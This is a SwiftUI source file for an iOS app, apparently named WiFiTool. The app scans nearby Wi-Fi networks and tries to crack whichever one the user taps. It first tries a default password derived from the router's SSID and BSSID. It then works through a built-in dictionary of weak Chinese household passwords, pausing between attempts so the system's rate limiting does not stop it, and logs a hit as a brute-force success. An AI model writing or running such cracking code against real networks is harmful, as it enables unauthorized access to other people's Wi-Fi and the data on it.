import SwiftUI

struct ContentView: View {
    @State private var wifiList: [[String: Any]] = []
    @State private var isScanning: Bool = false
    @State private var isRunningTask: Bool = false

    @State private var selectedSSID: String = ""
    @State private var selectedBSSID: String = ""
    @State private var logContent: String = "点击上方按钮扫描周边 Wi-Fi\n"

    // 内置 Top 常用中国家庭弱密码字典
    private let defaultDict = [
        "12345678", "88888888", "123456789", "11111111",
        "00000000", "1234567890", "87654321", "66666666",
        "123123123", "password", "admin123", "12344321"
    ]

    var body: some View {
        NavigationView {
            Form {
                // 1. 扫描热点列表
                Section(header: Text("周边 Wi-Fi 列表 (点击直接开始秒解/直连)")) {
                    Button(action: scanWiFi) {
                        HStack {
                            Label(isScanning ? "正在扫描..." : "刷新周边 WiFi", systemImage: "wifi")
                            if isScanning {
                                Spacer()
                                ProgressView()
                            }
                        }
                    }
                    .disabled(isScanning || isRunningTask)

                    List(wifiList, id: \.description) { item in
                        let ssid = item["ssid"] as? String ?? "未知"
                        let bssid = item["bssid"] as? String ?? ""
                        let rssi = item["rssi"] as? NSNumber ?? 0

                        Button(action: {
                            self.selectedSSID = ssid
                            self.selectedBSSID = bssid
                            self.startAutoSolve(ssid: ssid, bssid: bssid)
                        }) {
                            HStack {
                                VStack(alignment: .leading) {
                                    Text(ssid).font(.headline).foregroundColor(.primary)
                                    Text(bssid).font(.caption).foregroundColor(.gray)
                                }
                                Spacer()
                                Text("\(rssi) dBm").font(.caption2).foregroundColor(.secondary)
                            }
                        }
                    }
                }

                // 2. 状态与控制
                Section(header: Text("任务控制")) {
                    HStack {
                        Text("目标 SSID")
                        Spacer()
                        Text(selectedSSID.isEmpty ? "未选择" : selectedSSID).foregroundColor(.blue)
                    }

                    if isRunningTask {
                        HStack {
                            Text("状态")
                            Spacer()
                            Text("正在尝试连接...").foregroundColor(.orange)
                            ProgressView()
                        }
                    }
                }

                // 3. 执行日志
                Section(header: Text("自动破解进度与日志")) {
                    ScrollView {
                        Text(logContent)
                            .font(.system(.caption, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading)
                    }
                    .frame(height: 200)
                }
            }
            .navigationTitle("WiFiTool 全自动版")
        }
    }

    private func scanWiFi() {
        self.isScanning = true
        self.logContent += "正在发起 CoreWiFi 硬件探测...\n"

        WiFiScanner.scanAvailableNetworks { results, debugLog in
            self.isScanning = false
            if let log = debugLog { self.logContent += log }
            if let list = results, !list.isEmpty {
                self.wifiList = list
            }
        }
    }

    private func startAutoSolve(ssid: String, bssid: String) {
        self.isRunningTask = true
        self.logContent += "\n========== 开始目标 [\(ssid)] ==========\n"

        // 步骤 1: 模式 1 算法秒解测试
        if let algoPass = WiFiAutoEngine.calculateDefaultKey(withSSID: ssid, bssid: bssid) {
            self.logContent += "[模式 1] 命中光猫/路由算法规则，推算默认密码: \(algoPass)\n"
            self.logContent += "正在尝试连入验证...\n"

            WiFiAutoEngine.tryConnectSSID(ssid, password: algoPass) { success, error in
                if success {
                    self.logContent += "🎉 [成功连接] 正确密码为: \(algoPass)\n"
                    self.isRunningTask = false
                } else {
                    self.logContent += "[模式 1 验证未通过] 默认密码可能已被房东修改，转入模式 2...\n"
                    self.runDictLoop(ssid: ssid, index: 0)
                }
            }
        } else {
            self.logContent += "[模式 1] 未匹配到固定特征，直接转入模式 2 字典轮询...\n"
            self.runDictLoop(ssid: ssid, index: 0)
        }
    }

    // 步骤 2: 模式 2 字典逐个连接轮询
    private func runDictLoop(ssid: String, index: Int) {
        guard index < defaultDict.count else {
            self.logContent += "❌ [结束] 内置常见字典已尝试完毕，未测出密码。\n"
            self.isRunningTask = false
            return
        }

        let pwd = defaultDict[index]
        self.logContent += "[模式 2] 正在测试密码 (\(index + 1)/\(defaultDict.count)): \(pwd)\n"

        WiFiAutoEngine.tryConnectSSID(ssid, password: pwd) { success, _ in
            if success {
                self.logContent += "\n🎉🎉🎉 [爆破成功] Wi-Fi: \(ssid) 密码为: \(pwd)\n"
                self.isRunningTask = false
            } else {
                // 延迟 1 秒尝试下一个，防止系统守护进程频控拦截
                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                    self.runDictLoop(ssid: ssid, index: index + 1)
                }
            }
        }
    }
}
